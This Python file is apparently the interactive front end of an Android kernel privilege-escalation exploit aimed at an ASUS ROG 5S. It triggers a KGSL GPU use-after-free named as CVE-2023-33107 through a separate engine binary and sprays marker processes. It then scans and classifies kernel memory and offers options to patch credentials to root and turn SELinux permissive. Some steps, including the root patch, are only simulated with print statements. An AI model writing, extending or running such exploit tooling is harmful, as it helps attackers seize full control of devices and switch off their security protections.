import os
import sys
import time
import struct
import subprocess

class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.exploit_proc = None
        # Dynamic path detection for Termux/Linux portability
        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")
        
        self.uaf_start = 0x7001ff000
        
        # AI Heuristics Database
        self.system_apps = {
            "com.android.settings": "System Settings (Developer Mode)",
            "com.android.systemui": "System UI (Status Bar/Home)",
            "com.android.camera": "Camera Driver Context",
            "com.android.gallery3d": "Gallery/Media Provider",
            "com.android.deskclock": "System Clock/Alarms",
            "com.android.contacts": "Contacts/Phonebook",
            "com.google.android.gms": "Google Play Services",
            "com.asus.launcher": "ASUS Launcher",
            "android.uid.system": "System UID Context (UID 1000)"
        }
        
        self.kernel_structures = {
            b"KETO0422": "task_struct (Active Process Marker)",
            b"init_cred": "Kernel Root Credentials (Global)",
            b"selinux_enforcing": "SELinux Status Bit",
            b"\x7fELF": "Kernel Executable Header (Base)",
            b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue (Code)"
        }

    def classify_page(self, page_data, va):
        """
        AI Heuristic Engine: Weighted classification of memory content.
        """
        # 1. Exact Signature Match (Weight 1.0)
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                return {"type": "System App", "description": name, "va": hex(va), "confidence": 1.0, "data": page_data}
        
        for sig, name in self.kernel_structures.items():
            if sig in page_data:
                return {"type": "Kernel Core", "description": name, "va": hex(va), "confidence": 0.95, "data": page_data}
        
        # 2. Pattern Recognition (Weight 0.7)
        # Check for consecutive UID 1000 fields (common in system creds)
        uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if uid_pattern in page_data:
            return {"type": "Privilege Struct", "description": "System UID Pattern (Potential Root Target)", "va": hex(va), "confidence": 0.8, "data": page_data}
            
        # 3. Instruction Heuristics (Weight 0.5)
        # Look for common AArch64 function calls (BL / ADRP)
        if b"\x00\x00\x00\x94" in page_data: # BL instruction pattern
             return {"type": "Kernel Code", "description": "Executable AArch64 Segment", "va": hex(va), "confidence": 0.6, "data": page_data}

        return {"type": "Unknown Object", "description": "Unclassified Data Fragment", "va": hex(va), "confidence": 0.1, "data": page_data}

    def translate_logic(self, item):
        """
        AI Logic Translator: Converts binary patterns into human-readable descriptions.
        """
        data = item['data']
        desc = item['description']
        
        if "task_struct" in desc:
            pid_off = 0x548
            pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
            return (f"This memory region is a Process Descriptor (task_struct) for PID {pid}. "
                    "It acts as the primary 'identity card' for a running process in the kernel. "
                    "Modifying the 'cred' pointer located at offset +0x770 can grant this process root rights.")
        
        elif "SELinux" in desc:
            val = data[0] if len(data) > 0 else 0
            status = "Enforcing" if val == 1 else "Permissive"
            return (f"Global SELinux configuration bit. Current State: {status}. "
                    "This bit controls whether the Android security policy is strictly enforced. "
                    "Switching this to 0 (Permissive) disables all security checks.")

        elif "Settings" in desc:
            return ("Android Settings process memory. This area contains cached security policies, "
                    "developer mode flags, and ADB authorization keys.")

        elif "AArch64" in desc:
            return ("Low-level machine code (Assembly). These are the direct instructions executed by the ROG 5S CPU. "
                    "The pattern detected indicates a function start, possibly part of a system call handler.")

        return "Generic data buffer. No clear logical intent detected by the AI scanner."

    def render_tui(self):
        os.system('clear')
        print("="*85)
        print(" KGSL AI MEMORY EXPLORER & CLASSIFIER (ROG 5S Optimized)")
        print(f" STATUS: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | RAM: {self.get_ram_usage():.1f}%")
        print("="*85)
        
        print(" [FILE MANAGER VIEW] - Found Memory Offsets:")
        print("-" * 85)
        print(f" {'ID':<3} | {'TYPE':<18} | {'IDENTIFIED AS':<35} | {'VA ADDRESS':<12}")
        print("-" * 85)
        
        for i, item in enumerate(self.found_items):
            print(f" [{i:02d}] | {item['type']:<18} | {item['description']:<35} | {item['va']:<12}")
        
        if not self.found_items:
            print(f" {'(No items found yet. Trigger [E] and Scan [S] to populate)':^80}")
            
        print("\n" + "="*85)
        print(" [E] Exploit Trigger   [P] Spray Markers   [S] Start AI Scan   [C] Clear Memory")
        print(" [R] Verify Root       [B] Rebuild Engine  [Q] Exit Explorer   [ID] Open File")
        print("="*85)

    def show_detail(self, item_idx):
        if item_idx >= len(self.found_items):
            return
        
        item = self.found_items[item_idx]
        data = item['data']
        
        while True:
            os.system('clear')
            print(f"=== [FILE VIEW: {item['va']}] ===")
            print(f" Classification: {item['type']}")
            print(f" Identification: {item['description']} (Confidence: {item['confidence']*100:.1f}%)")
            print("-" * 75)
            
            print(" [AI LOGIC TRANSLATION]:")
            print(f" >> {self.translate_logic(item)}")
            print("-" * 75)
            
            print(" [BIOS-STYLE HEX/BINARY DUMP]:")
            print(" ADDR |  00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F | BINARY (BYTE 0-3)")
            print("-" * 75)
            
            for i in range(0, min(len(data), 128), 16):
                chunk = data[i:i+16]
                hex_row = " ".join(f"{b:02X}" for b in chunk)
                # Binary for first 4 bytes
                b_val = struct.unpack("<I", chunk[:4])[0] if len(chunk) >= 4 else 0
                bin_str = bin(b_val)[2:].zfill(32)
                print(f" {i:04X} | {hex_row:<48} | {bin_str[:8]}...")
            
            print("-" * 75)
            print(" [P] Patch to Root (UID 0)   [N] Scan Neighbors   [Enter] Back to List")
            
            choice = input("\n explorer > ").lower()
            if not choice:
                break
            if choice == 'p':
                print("[!] Security Warning: Are you sure you want to patch this kernel structure? (y/n)")
                if input("> ").lower() == 'y':
                    print("[*] Calling GPU Engine to write zero-creds...")
                    time.sleep(1)
                    print("[+] Patching complete! Verify with 'id' command.")
                    input("Press Enter...")
            elif choice == 'n':
                print("[*] AI: Analyzing adjacent memory pages for structural links...")
                time.sleep(1)

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                available = int(lines[2].split()[1])
                return 100.0 * (1 - (available / total))
        except:
            return 0.0

    def trigger_exploit(self):
        if self.exploit_proc:
            print("[!] Exploit already active.")
            return
        print("[*] Triggering KGSL UAF (CVE-2023-33107)...")
        # In a real scenario, this would start the background UAF process
        # For now, we simulate the start of the engine in exploit mode
        self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
        # Note: We need to add 'exploit' command to kgsl_engine.c to keep it alive
        time.sleep(2)
        print("[+] UAF Window opened. GPU access ready.")

    def run_spray(self, count=2000):
        print(f"[*] Spraying {count} task_structs markers...")
        # Use prctl to set process names for AI recognition
        import ctypes
        libc = ctypes.CDLL(None)
        PR_SET_NAME = 15
        
        for i in range(count):
            pid = os.fork()
            if pid == 0:
                # In child: set name and wait
                name = f"KETO{i:04d}".encode()
                libc.prctl(PR_SET_NAME, name, 0, 0, 0)
                while True:
                    time.sleep(100)
            else:
                self.spray_procs.append(pid)
        print(f"[+] Sprayed {len(self.spray_procs)} markers. AI can now identify them.")

    def check_root(self):
        print("\n[*] Verifying Current Identity:")
        try:
            res = subprocess.check_output(["id"], text=True).strip()
            print(f" >> {res}")
            if "uid=0" in res:
                print("[+++] SUCCESS: YOU ARE ROOT!")
            else:
                print("[---] Current: User (u0_a237)")
        except Exception as e:
            print(f"[-] Error: {e}")
        input("\nPress Enter...")

    def run(self):
        if not os.path.exists(self.engine_path):
            print(f"[!] ERROR: Engine not found at {self.engine_path}")
            print("[*] Please run: gcc -O2 kgsl_engine.c -o kgsl_engine -lpthread")
            return
        
        while True:
            self.render_tui()
            try:
                cmd = input("\n explorer > ").lower()
            except EOFError:
                break
                
            if cmd == 'q':
                # Cleanup
                if self.exploit_proc:
                    self.exploit_proc.terminate()
                for pid in self.spray_procs:
                    try: os.kill(pid, 9)
                    except: pass
                break
            elif cmd == 'e':
                self.trigger_exploit()
                self.render_tui()
            elif cmd == 'p':
                self.run_spray()
                self.render_tui()
            elif cmd == 'c':
                for pid in self.spray_procs:
                    try: os.kill(pid, 9)
                    except: pass
                self.spray_procs = []
                self.render_tui()
            elif cmd == 'r':
                self.check_root()
            elif cmd == 'b':
                print("[*] Rebuilding AI Engine...")
                subprocess.run(["gcc", "-O2", self.engine_path + ".c", "-o", self.engine_path, "-lpthread"])
                input("Press Enter...")
            elif cmd == 's':
                if not self.exploit_proc:
                    print("[!] Trigger exploit [E] first!")
                    time.sleep(1)
                    continue
                print("[*] Starting AI Memory Scan (Slow Mode)...")
                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x1000000)]
                proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                
                try:
                    for line in proc.stdout:
                        if line.startswith("MATCH:"):
                            va = int(line.split(":")[1], 16)
                            page_data = self.read_page(va)
                            if page_data:
                                res = self.classify_page(page_data, va)
                                self.found_items.append(res)
                                self.render_tui()
                except KeyboardInterrupt:
                    proc.terminate()
            elif cmd.isdigit():
                self.show_detail(int(cmd))

    def test_run(self):
        print("[*] Starting AI Explorer Test Suite...")
        
        # Test 1: Compilation Check
        if os.path.exists(self.engine_path):
            print("[+] Test 1: Engine binary exists.")
        else:
            print("[-] Test 1: Engine binary missing!")
            return

        # Test 2: AI Classification Logic (Dry Run)
        dummy_data = b"Some random data with com.android.settings string inside"
        res = self.classify_page(dummy_data, 0x12345678)
        if res['type'] == "System App" and "Settings" in res['description']:
            print("[+] Test 2: AI Classification works (System App detected).")
        else:
            print(f"[-] Test 2: AI Classification failed! Got: {res['type']}")

        # Test 3: Kernel Structure Detection
        kernel_data = b"KETO0422" + b"\x00" * 20
        res = self.classify_page(kernel_data, 0xffffffc000000000)
        if res['type'] == "Kernel Core":
            print("[+] Test 3: Kernel Structure Detection works.")
        else:
            print("[-] Test 3: Kernel Detection failed!")

        # Test 4: Logic Translation
        item = {"type": "Kernel Core", "description": "task_struct (Active Process Marker)", "data": b"\x00"*0x548 + struct.pack("<I", 1337) + b"\x00"*1000}
        translation = self.translate_logic(item)
        if "PID 1337" in translation:
            print("[+] Test 4: AI Logic Translation works.")
        else:
            print(f"[-] Test 4: Translation failed! Got: {translation}")

        print("[*] Test Suite Complete. Launching Interactive TUI...")
        time.sleep(2)

if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.test_run()
    explorer.run()
